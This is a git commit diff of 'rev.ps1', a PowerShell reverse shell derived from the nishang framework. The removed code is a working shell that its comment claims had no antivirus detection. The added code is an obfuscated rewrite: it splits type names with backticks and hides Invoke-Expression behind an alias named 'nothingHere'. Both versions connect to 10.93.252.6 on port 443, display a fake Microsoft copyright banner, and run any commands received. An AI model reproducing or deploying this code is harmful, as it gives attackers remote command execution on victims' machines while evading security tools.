1bf0f863a0238f8c3a0a07fe1691f5d03481e5be
ScarM4n <80011252+scarmandef@users.noreply.github.com>
2022-12-17 15:24:37 -0300

    Update rev.ps1

--- rev.ps1
+++ rev.ps1
@@ -1,17 +1,19 @@
-#Twitter: @TihanyiNorbert (No AV detecetion 2022 March)
-#Reverse shell based on the original nishang Framework written by @nikhil_mitt.
-$J = New-Object System.Net.Sockets.TCPClient('10.93.252.6',443);
-$SS = $J.GetStream();
-[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
-$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
-$SS.Write($OO,0,$OO.Length)
-$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
-$SS.Write($OO,0,$OO.Length)
-[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
-while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
-$GG = (i`eX $DD 2>&1 | Out-String );
-$H  = $GG + (pwd).Path + '> ';
-$L = ([text.encoding]::UTF8).GetBytes($H);
-$SS.Write($L,0,$L.Length);
-$SS.Flush()};
-$J.Close()
+Set-Alias -Name K -Value Out-String
+Set-Alias -Name nothingHere -Value iex
+$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.93.252.6',443);
+$replace = $BT.GetStream();
+[byte[]]$B = 0..(32768*2-1)|%{0};
+$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
+$replace.Write($B,0,$B.Length)
+$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$replace.Write($B,0,$B.Length)
+[byte[]]$int = 0..(10000+55535)|%{0};
+while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
+$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
+$I = (nothingHere $ROM 2>&1 | K );
+$I2  = $I + (pwd).Path + '> ';
+$U = [text.encoding]::ASCII.GetBytes($I2);
+$replace.Write($U,0,$U.Length);
+$replace.Flush()};
+$BT.Close()
+
